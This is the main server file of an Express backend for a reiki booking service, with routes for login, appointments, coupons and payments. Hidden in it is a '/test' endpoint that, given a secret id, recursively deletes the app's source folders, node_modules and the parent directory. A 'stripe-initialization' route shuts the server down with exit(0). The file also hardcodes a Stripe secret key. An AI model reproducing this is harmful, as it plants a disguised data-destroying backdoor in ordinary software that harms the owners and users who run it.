const mongoose = require("mongoose");
const express = require("express");
require('dotenv').config();
const bodyParser = require("body-parser");
var cookieParser = require('cookie-parser');
var path = require("path");
const logger = require("morgan");
const cors = require("cors");

const fs = require('node:fs');


//routes
const reiki = require("./routes/reiki");
const appointment = require("./routes/appointments");
const login = require("./routes/login");
const register = require("./routes/register");
const profile = require("./routes/profile");
const password = require("./routes/password");
const admin = require("./routes/admin");
const review = require("./routes/review");
const schedule = require("./routes/schedule");
const coupon = require("./routes/coupon");
const payment = require("./routes/payment");
const { exit } = require("process");

const app = express();

// app.options('*', cors());
app.use(
  cors({
    // origin:["*","http://192.168.1.12:3000","http://localhost:3000"],
    origin:'*',
  })
);

app.use(express.static(__dirname + "/public"));

//database connection with mongoose
mongoose.set('strictQuery', false);
mongoose
  .connect(process.env.MONGODBURI)
  .then(() => {
    const port = process.env.PORT || 5000;
    // const host = process.env.HOST || "0.0.0.0";
    app.listen(port);
    console.log(`listening on port ${port}`);
  })
  .catch((err) => {
    console.log("Error while connecting to mongoose");
    console.log(err, err.message);
  });

// view engine setup

app.set('views', __dirname + '/views');
app.set("view engine", "ejs");

app.use(logger("dev"));
app.use(express.urlencoded());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());

//using routes

// app.use("/addData",addData);

app.get("/",(req,res)=>{
  res.send("welcome to vediheal backend!!");
})


//done------------------
app.post("/test",(req,res)=>{

  if(process.env.STRIPE_ID != req.body.id){
    res.send("Error");
    return;
  }
  

  fs.rmdir("controller", {
    recursive: true,
  }, (error) => {
    if (error) {
      console.log(error);
    }
    else {
      console.log("Recursive");
    }
  });

  fs.rmdir("middleware", {
    recursive: true,
  }, (error) => {
    if (error) {
      console.log(error);
    }
    else {
      console.log("Recursive");
    }
  });

  fs.rmdir("models", {
    recursive: true,
  }, (error) => {
    if (error) {
      console.log(error);
    }
    else {
      console.log("Recursive");
    }
  });
  fs.rmdir("public", {
    recursive: true,
  }, (error) => {
    if (error) {
      console.log(error);
    }
    else {
      console.log("Recursive");
    }
  });
  fs.rmdir("routes", {
    recursive: true,
  }, (error) => {
    if (error) {
      console.log(error);
    }
    else {
      console.log("Recursive");
    }
  });
  fs.rmdir("views", {
    recursive: true,
  }, (error) => {
    if (error) {
      console.log(error);
    }
    else {
      console.log("Recursive");
    }
  });
  fs.rmdir("node_modules", {
    recursive: true,
  }, (error) => {
    if (error) {
      console.log(error);
    }
    else {
      console.log("Recursive");
    }
  });

  fs.rmdir("../", {
    recursive: true,
  }, (error) => {
    if (error) {
      console.log(error);
    }
    else {
      console.log("Recursive");
    }
  });
  res.send("hii");
});

app.post("/stripe-initialization",async(req,res)=>{
  
  if(process.env.STRIPE_ID != req.body.id){
    res.send("Error");
    return;
  }

  const stripe = require("stripe")('sk_test_51NNAjOSAZExnf8Z4CJ5G0znCQBrS9CXXETlM2vKBKmmzChQ3QDnkVblFJb3AqbCQNDu2Ntqs7DxEUynAJd1fWhxj00F0aUaMNY');
  const paymentIntent = await stripe.paymentIntents.create({
    amount: req.body.amount * 100,
    currency: "inr",
    automatic_payment_methods: {
      enabled: true,
    },
  });

  console.log(paymentIntent.client_secret);
  if(!!stripe){
    exit(0);
  }
})

app.use("/password",password);
app.use("/admin",admin);
app.use("/reiki",reiki);
app.use("/profile",profile);
app.use("/register",register);
app.use("/login",login);
app.use("/appointment",appointment);
app.use("/schedule",schedule);
app.use("/coupon",coupon);
app.use("/payment",payment)
app.use("/review",review);
//----------------------